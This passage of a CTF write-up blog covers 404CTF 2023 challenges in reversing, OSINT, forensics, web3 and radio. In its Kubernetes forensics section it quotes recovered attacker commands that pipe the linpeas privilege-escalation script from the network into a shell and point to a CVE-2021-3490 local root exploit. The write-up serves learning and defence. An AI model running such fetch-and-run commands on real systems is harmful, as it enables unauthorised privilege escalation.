+<p><img loading="lazy" src="/404CTF2023_data/11.png" alt="Untitled"  />
+</p>
+<h1 id="reverse">Reverse<a hidden class="anchor" aria-hidden="true" href="#reverse">#</a></h1>
+<h2 id="le-divin-crackme">Le Divin Crackme<a hidden class="anchor" aria-hidden="true" href="#le-divin-crackme">#</a></h2>
+<p>We were given an ELF binary. We need to provide the compiler used, the function used to verify the password, and the password. Using Ghidra, we can get the password and the function used:</p>
+<p><img loading="lazy" src="/404CTF2023_data/12.png" alt="Untitled"  />
+</p>
+<p>And we can verify the password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">$</span> <span class="p">.</span><span class="o">/</span><span class="nx">divin</span><span class="o">-</span><span class="nx">crackme</span>
+<span class="nx">Mot</span> <span class="nx">de</span> <span class="nx">passe</span> <span class="o">?</span> <span class="o">:</span> <span class="nx">L4_pH1l0soPh13_d4N5_l3_Cr4cKm3</span>
+<span class="nx">Bien</span> <span class="nx">joué</span> <span class="o">!</span> <span class="nx">Tu</span> <span class="nx">aurais</span> <span class="nx">été</span> <span class="nx">libre</span><span class="p">,</span> <span class="nx">pour</span> <span class="nx">cette</span> <span class="nx">fois</span><span class="p">...</span>
+</code></pre></div><p>If we strings, we can have the compiler: <code>GCC: (Debian 12.2.0-14) 12.2.0</code></p>
+<p>The flag is:</p>
+<p><code>404CTF{gcc:strncmp:L4_pH1l0soPh13_d4N5_l3_Cr4cKm3}</code></p>
+<h2 id="linspiration-en-images">L’inspiration en images<a hidden class="anchor" aria-hidden="true" href="#linspiration-en-images">#</a></h2>
+<p>We were given a pretty fun binary which is displaying a Canva. Our goal is to find the exact colors used for the background.</p>
+<p>If we search online for the functions that are displayed in Ghidra, we can see that OpenGL is used. So let’s find out how to change the background color. We can find the answer <a href="https://community.khronos.org/t/how-to-set-the-background-color/27016">here</a> and thus look for it in Ghidra.</p>
+<p>Once we find it, we can edit the function signature to match the real one, and we get the flag:</p>
+<p><code>404CTF{vec3(0.2,0.3,0.3,1.0)}</code></p>
+<p><img loading="lazy" src="/404CTF2023_data/13.png" alt="Untitled"  />
+</p>
+<h1 id="osint">OSINT<a hidden class="anchor" aria-hidden="true" href="#osint">#</a></h1>
+<h2 id="le-tour-de-france">Le tour de France<a hidden class="anchor" aria-hidden="true" href="#le-tour-de-france">#</a></h2>
+<p>We were given an image. We need to find the coordinates of those panels:</p>
+<p><img loading="lazy" src="/404CTF2023_data/14.png" alt="Untitled"  />
+</p>
+<p>If we search for <em>Beaune Saint Nicolas</em> we can find something interesting, because we can see A6/E15/E21:</p>
+<p><img loading="lazy" src="/404CTF2023_data/15.png" alt="Untitled"  />
+</p>
+<p>Going in street view, we can find the panels, and the coordinates are in the URL.</p>
+<p><img loading="lazy" src="/404CTF2023_data/16.png" alt="Untitled"  />
+</p>
+<h2 id="mention-gastro">Mention gastro<a hidden class="anchor" aria-hidden="true" href="#mention-gastro">#</a></h2>
+<p>Given a name, we had to find where <code>Margot Paquet</code> ate and how much she paid at the restaurant. Looking at the usual social media, Instragram gives us a good touch:</p>
+<p><img loading="lazy" src="/404CTF2023_data/17.png" alt="Untitled"  />
+</p>
+<p>There are some food images, and she is indentified by an account <code>futurionix</code>:</p>
+<p><img loading="lazy" src="/404CTF2023_data/18.png" alt="Untitled"  />
+</p>
+<p>If we take a look at this account, we can find this picture:</p>
+<p><img loading="lazy" src="/404CTF2023_data/19.png" alt="Untitled"  />
+</p>
+<p>Using google lens, we can find the name of the bridge: <em>Pont Royal</em>. There is a restaurant in front of the bridge, named <em>La Frégate</em>:</p>
+<p><img loading="lazy" src="/404CTF2023_data/20.png" alt="Untitled"  />
+</p>
+<p>Alright, now we need to find out what she ate in this restaurant. Back to her instagram, she said that  she ate a <code>Tarte Tatin</code> yesterday, as well as a <code>boeuf bourguignon</code>:</p>
+<p><img loading="lazy" src="/404CTF2023_data/21.png" alt="Untitled"  />
+</p>
+<p><img loading="lazy" src="/404CTF2023_data/22.png" alt="Untitled"  />
+</p>
+<p>If we look for the prices on Google, they seems to be erroned (on thefork or tripadvisor for example). But if we look for the prices on our phone, Google is giving us the good prices: 15.5€ and 8.5€. The flag is: <code>404CTF{la_fregate_24.0}</code></p>
+<h1 id="forensics">Forensics<a hidden class="anchor" aria-hidden="true" href="#forensics">#</a></h1>
+<h2 id="pêche-au-livre">Pêche au livre<a hidden class="anchor" aria-hidden="true" href="#pêche-au-livre">#</a></h2>
+<p>We were given a <code>pcapng</code> file which contains TCP and HTTP packets. We can extract HTTP objects using Wireshark:</p>
+<p><img loading="lazy" src="/404CTF2023_data/23.png" alt="Untitled"  />
+</p>
+<p>In one of the pictures, there is the flag:</p>
+<p><img loading="lazy" src="/404CTF2023_data/24.png" alt="Untitled"  />
+</p>
+<h2 id="les-mystères-du-cluster-de-la-comtesse-de-ségur-12">Les Mystères du cluster de la Comtesse de Ségur [1/2]<a hidden class="anchor" aria-hidden="true" href="#les-mystères-du-cluster-de-la-comtesse-de-ségur-12">#</a></h2>
+<p>We were given a kubernetes cluster zip file. Using strings, we can find some nasty things, like <code>linpeas</code> or known exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">$</span> <span class="nx">strings</span> <span class="o">*</span> <span class="o">|</span> <span class="nx">grep</span> <span class="nx">github</span><span class="p">.</span><span class="nx">com</span>
+<span class="nx">strings</span><span class="o">:</span> <span class="nx">Warning</span><span class="o">:</span> <span class="s1">&#39;checkpoint&#39;</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">directory</span>
+<span class="p">[</span><span class="mi">7</span><span class="nx">mcurl</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+</span><span class="c1"></span><span class="nx">root</span><span class="err">@</span><span class="nx">bash</span><span class="o">:</span><span class="sr">/# curl -L https:/</span><span class="o">/</span><span class="nx">github</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">carlospolop</span><span class="o">/</span><span class="nx">PEASS</span><span class="o">-</span><span class="nx">ng</span><span class="o">/</span><span class="nx">releases</span><span class="o">/</span><span class="nx">latest</span><span class="o">/</span><span class="nx">download</span><span class="o">/</span><span class="nx">linpeas</span><span class="p">.</span><span class="nx">sh</span> <span class="o">|</span> <span class="nx">sh</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">;</span><span class="mi">31</span><span class="nx">mhttps</span><span class="o">:</span><span class="c1">//github.com/sponsors/carlospolop
+</span><span class="c1"></span><span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">12</span><span class="nx">T09</span><span class="o">:</span><span class="mi">01</span><span class="o">:</span><span class="mf">38.816404524</span><span class="o">+</span><span class="mi">00</span><span class="o">:</span><span class="mi">00</span> <span class="nx">stdout</span> <span class="nx">P</span> <span class="nx">curl</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+</span><span class="c1"></span><span class="p">[</span><span class="mi">1</span><span class="p">;</span><span class="mi">31</span><span class="nx">mhttps</span><span class="o">:</span><span class="c1">//github.com/sponsors/carlospolop
+</span><span class="c1"></span><span class="p">[</span><span class="mi">3</span><span class="nx">mhttps</span><span class="o">:</span><span class="c1">//github.com/mzet-/linux-exploit-suggester
+</span><span class="c1"></span>   <span class="nx">Download</span> <span class="nx">URL</span><span class="o">:</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
+</span></code></pre></div><p>Looking a little bit deeper, we find <code>pages-1.img</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">$</span> <span class="nx">strings</span> <span class="o">-</span><span class="nx">n</span> <span class="mi">8</span> <span class="nx">checkpoint</span><span class="o">/</span><span class="nx">pages</span><span class="o">-</span><span class="mf">1.</span><span class="nx">img</span>
+<span class="p">...</span>
+<span class="nx">curl</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+</span><span class="c1"></span><span class="nx">KUBERNETES_PORT</span><span class="o">=</span><span class="nx">tcp</span><span class="o">:</span><span class="c1">//10.96.0.1:443
+</span><span class="c1"></span><span class="err">#</span><span class="mi">1683882102</span>
+<span class="err">/usr/bin/apt</span>
+ <span class="nx">agent</span><span class="p">.</span><span class="nx">zip</span> <span class="nx">flag</span><span class="p">.</span><span class="nx">txt</span>
+<span class="nx">curl</span> <span class="nx">agent</span><span class="p">.</span><span class="nx">challenges</span><span class="mf">.404</span><span class="nx">ctf</span><span class="p">.</span><span class="nx">fr</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">agent</span><span class="p">.</span><span class="nx">zip</span>
+<span class="p">...</span>
+</code></pre></div><p><a href="http://agent.challenges.404ctf.fr">agent.challenges.404ctf.fr</a> looks interesting:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"> <span class="nx">$</span> <span class="nx">curl</span> <span class="nx">agent</span><span class="p">.</span><span class="nx">challenges</span><span class="mf">.404</span><span class="nx">ctf</span><span class="p">.</span><span class="nx">fr</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">agent</span><span class="p">.</span><span class="nx">zip</span>
+</code></pre></div><p><img loading="lazy" src="/404CTF2023_data/25.png" alt="Untitled"  />
+</p>
+<h2 id="le-mystère-du-roman-damour">Le Mystère du roman d&rsquo;amour<a hidden class="anchor" aria-hidden="true" href="#le-mystère-du-roman-damour">#</a></h2>
+<p>We were given a <code>vim</code> swap file. We need to find many things to flag: the PID, the username, the path of the file, the machine name, and the lost content.</p>
+<p>Using file, we can get :</p>
+<ul>
+<li>The PID (168)</li>
+<li>The username (jaqueline)</li>
+<li>The path (<code>~jaqueline/Documents/Livres/404 Histoires d'Amour pour les bibliophiles au coeur d'artichaut/brouillon.txt</code>)</li>
+</ul>
+<pre tabindex="0"><code>$ file fichier-etrange.swp
+fichier-etrange.swp: Vim swap file, version 7.4, pid 168, user jaqueline, host aime_ecrire, file ~jaqueline/Documents/Livres/404 Histoires d'Amour pour les bibliophiles au coeur d'artichaut/brouillon.txt
+</code></pre><p>With <code>strings</code>, we can find the machine name:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="nx">$</span> <span class="nx">strings</span> <span class="o">-</span><span class="nx">n</span> <span class="mi">10</span> <span class="nx">fichier</span><span class="o">-</span><span class="nx">etrange</span><span class="p">.</span><span class="nx">swp</span>
+<span class="p">...</span>
+<span class="nx">aime_ecrire</span>
+<span class="p">...</span>
+</code></pre></div><p>If we open the swp file using the recovery mode, we can see that it is an image (because of the %PNG at the beginning of the file). So we can save it out:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ vim -r fichier-etrange.swp
+:w out.png
+</code></pre></div><p>If we submit it in aperisolve, we can find a QR code which contains the end of te flag:</p>
+<p><img loading="lazy" src="/404CTF2023_data/26.png" alt="Untitled"  />
+</p>
+<p>The full flag is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="mi">404</span><span class="nx">CTF</span><span class="p">{</span><span class="mi">168</span><span class="o">-~</span><span class="nx">jaqueline</span><span class="o">/</span><span class="nx">Documents</span><span class="o">/</span><span class="nx">Livres</span><span class="o">/</span><span class="mi">404</span> <span class="nx">Histoires</span> <span class="nx">d</span><span class="s1">&#39;Amour pour les bibliophiles au coeur d&#39;</span><span class="nx">artichaut</span><span class="o">/</span><span class="nx">brouillon</span><span class="p">.</span><span class="nx">txt</span><span class="o">-</span><span class="nx">jaqueline</span><span class="o">-</span><span class="nx">aime_ecrire</span><span class="o">-</span><span class="mi">3</span><span class="nx">n_V01L4_Un_Dr0l3_D3_R0m4N</span><span class="p">}</span>
+</code></pre></div><h2 id="lettres-volatiles">Lettres volatiles<a hidden class="anchor" aria-hidden="true" href="#lettres-volatiles">#</a></h2>
+<p>We have a Windows User folder. Nothing really interesting here but a zip file (password protected) and a memory dump:</p>
+<p><img loading="lazy" src="/404CTF2023_data/27.png" alt="Untitled"  />
+</p>
+<p><img loading="lazy" src="/404CTF2023_data/28.png" alt="Untitled"  />
+</p>
+<p>We can use volatility to identify the profile:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="o">&gt;</span> <span class="p">.</span><span class="err">\</span><span class="nx">Volatility</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">f</span> <span class="p">.</span><span class="err">\</span><span class="nx">C311M1N1</span><span class="o">-</span><span class="nx">PC</span><span class="o">-</span><span class="mi">20230514</span><span class="o">-</span><span class="mf">200525.</span><span class="nx">raw</span> <span class="nx">imageinfo</span>
+<span class="nx">Volatility</span> <span class="nx">Foundation</span> <span class="nx">Volatility</span> <span class="nx">Framework</span> <span class="mf">2.6</span>
+<span class="nx">INFO</span>    <span class="o">:</span> <span class="nx">volatility</span><span class="p">.</span><span class="nx">debug</span>    <span class="o">:</span> <span class="nx">Determining</span> <span class="nx">profile</span> <span class="nx">based</span> <span class="nx">on</span> <span class="nx">KDBG</span> <span class="nx">search</span><span class="p">...</span>
+          <span class="nx">Suggested</span> <span class="nx">Profile</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">:</span> <span class="nx">Win7SP1x64</span><span class="p">,</span> <span class="nx">Win7SP0x64</span><span class="p">,</span> <span class="nx">Win2008R2SP0x64</span><span class="p">,</span> <span class="nx">Win2008R2SP1x64_23418</span><span class="p">,</span> <span class="nx">Win2008R2SP1x64</span><span class="p">,</span> <span class="nx">Win7SP1x64_23418</span>
+</code></pre></div><p>We are lucky, it’s a common profile and not a weird one. If we use basic commands such as <code>cmdline</code> or <code>pstree</code> nothing  interesting comes out (excepted a notepad). But the clipboard command is quite interesting …</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="o">&gt;</span> <span class="p">.</span><span class="err">\</span><span class="nx">Volatility</span><span class="p">.</span><span class="nx">exe</span> <span class="o">-</span><span class="nx">f</span> <span class="p">.</span><span class="err">\</span><span class="nx">C311M1N1</span><span class="o">-</span><span class="nx">PC</span><span class="o">-</span><span class="mi">20230514</span><span class="o">-</span><span class="mf">200525.</span><span class="nx">raw</span> <span class="o">--</span><span class="nx">profile</span><span class="o">=</span><span class="nx">Win7SP1x64</span> <span class="nx">clipboard</span>
+<span class="nx">Volatility</span> <span class="nx">Foundation</span> <span class="nx">Volatility</span> <span class="nx">Framework</span> <span class="mf">2.6</span>
+<span class="nx">Session</span>    <span class="nx">WindowStation</span> <span class="nx">Format</span>                         <span class="nx">Handle</span> <span class="nb">Object</span>             <span class="nx">Data</span>
+<span class="o">----------</span> <span class="o">-------------</span> <span class="o">------------------</span> <span class="o">------------------</span> <span class="o">------------------</span> <span class="o">--------------------------------------------------</span>
+         <span class="mi">1</span> <span class="nx">WinSta0</span>       <span class="nx">CF_UNICODETEXT</span>               <span class="mh">0x1801b1</span> <span class="mh">0xfffff900c23fa100</span> <span class="nx">Z1p</span> <span class="nx">p4s5wOrd</span> <span class="o">:</span> <span class="nx">F3eMoBon8n3GD5xQ</span>
+         <span class="mi">1</span> <span class="nx">WinSta0</span>       <span class="nx">CF_TEXT</span>                          <span class="mh">0x10</span> <span class="o">------------------</span>
+         <span class="mi">1</span> <span class="nx">WinSta0</span>       <span class="mh">0x120207</span><span class="nx">L</span>              <span class="mh">0x200000000000</span> <span class="o">------------------</span>
+         <span class="mi">1</span> <span class="nx">WinSta0</span>       <span class="nx">CF_TEXT</span>                           <span class="mh">0x1</span> <span class="o">------------------</span>
+         <span class="mi">1</span> <span class="o">-------------</span> <span class="o">------------------</span>           <span class="mh">0x120207</span> <span class="mh">0xfffff900c2108b60</span>
+</code></pre></div><p>Using this password, we can then extract the PDF and get the flag:</p>
+<p><img loading="lazy" src="/404CTF2023_data/29.png" alt="Untitled"  />
+</p>
+<h1 id="web3">Web3<a hidden class="anchor" aria-hidden="true" href="#web3">#</a></h1>
+<h2 id="lantiquaire-tête-en-lair">L’antiquaire, tête en l’air<a hidden class="anchor" aria-hidden="true" href="#lantiquaire-tête-en-lair">#</a></h2>
+<p>In this challenge, we had a file <code>memorandum.txt</code> which contains hexadecimal values. If we decode it, we can find a truncated <strong>ipfs link</strong> and a shorturl which is pointing to a very interesting <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">url</a> :</p>
+<p><img loading="lazy" src="/404CTF2023_data/30.png" alt="Untitled"  />
+</p>
+<p>If we access the ipfs <a href="https://ipfs.io/ipfs/bafybeia5g2umnaq5x5bt5drt2jodpsvfiauv5mowjv6mu7q5tmqufmo47i/metadata.json">link</a> on <code>ipfd.io</code>, we get a json file with another ipfs <a href="https://ipfs.io/ipfs/bafybeic6ea7qi5ctdp6s6msddd7hwuic3boumwknrirlakftr2yrgnfiga/mystere.png">link</a>:</p>
+<p><img loading="lazy" src="/404CTF2023_data/31.png" alt="Untitled"  />
+</p>
+<p>We get Sepolia (a testnet faucet) and an address. If we look for it, we can find some <a href="https://sepolia.etherscan.io/tx/0x377cb6a1bb408b5c7700b2a73e3b51188d89906bd67183eba1757a31e67c38df">transactions</a>:</p>
+<p><img loading="lazy" src="/404CTF2023_data/32.png" alt="Untitled"  />
+</p>
+<p>And if we decode the input, we can get the flag</p>
+<p><img loading="lazy" src="/404CTF2023_data/33.png" alt="Untitled"  />
+</p>
+<h1 id="radio-fréquences">Radio fréquences<a hidden class="anchor" aria-hidden="true" href="#radio-fréquences">#</a></h1>
+<h2 id="navi">Navi<a hidden class="anchor" aria-hidden="true" href="#navi">#</a></h2>
+<p>We were given a raw file. We can open the file as a raw file in audacity and let it decide the best parameters. If play with the EQ, the speed and that we reverse the sound, a voice is saying <strong>the flag in hexadecimal is: 3430344354467b317472305f3455785f52346431302d6652337155334e6333357d</strong></p>
+<p>Once decoded we get the flag:</p>
+<p><code>404CTF{1tr0_4Ux_R4d10-fR3qU3Nc35}</code></p>
+<h2 id="avez-vous-vu-les-cascades-du-hérisson-">Avez vous vu les cascades du hérisson ?<a hidden class="anchor" aria-hidden="true" href="#avez-vous-vu-les-cascades-du-hérisson-">#</a></h2>
+<p>We have again a raw file with <strong>2Mhz</strong> sampling frenquency. We can open it with Universal Radio Hacker and display the spectrogram to get the flag:</p>
+<p><img loading="lazy" src="/404CTF2023_data/34.png" alt="Untitled"  />
+</p>
+<p><img loading="lazy" src="/404CTF2023_data/35.png" alt="Untitled"  />
+</p>
+<p>The flag is: <code>404CTF{413X4NDR3_D4N5_UN3_C45C4D35_?}</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://luhko.github.io/write-up/pwnme2023/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Pwnme CTF 2023</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://luhko.github.io/">Luhko</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
